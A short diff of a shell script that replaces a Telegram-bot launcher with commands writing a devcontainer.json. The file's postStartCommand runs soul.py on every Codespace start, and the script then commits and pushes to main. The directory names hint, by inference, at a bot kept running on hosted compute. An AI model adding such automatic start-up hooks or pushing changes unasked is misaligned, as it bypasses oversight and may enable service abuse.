@@ -1,15 +1,22 @@
-#!/bin/bash
+mkdir -p .devcontainer
+cat <<EOL > .devcontainer/devcontainer.json
+{
+    "name": "My Codespace",
+    "image": "mcr.microsoft.com/vscode/devcontainers/python:3.8",
+    "postStartCommand": "python3 /workspaces/soul/soul.py",
+    "customizations": {
+        "vscode": {
+            "settings": {
+                "python.pythonPath": "/usr/local/bin/python"
+            },
+            "extensions": [
+                "ms-python.python"
+            ]
+        }
+    }
+}
+EOL
 
-# Grant execute permissions to all scripts
-chmod +x scripts/*
-
-# Check if telebot is installed
-if python -c "import telebot" &> /dev/null; then
-    echo "Telebot is already installed."
-else
-    echo "Telebot not found. Installing..."
-    pip install pyTelegramBotAPI
-fi
-
-# Execute the bot script
-python /workspaces/dds/run_bot.py
+git add .devcontainer/devcontainer.json
+git commit -m "Add postStartCommand to run Python script automatically"
+git push origin main
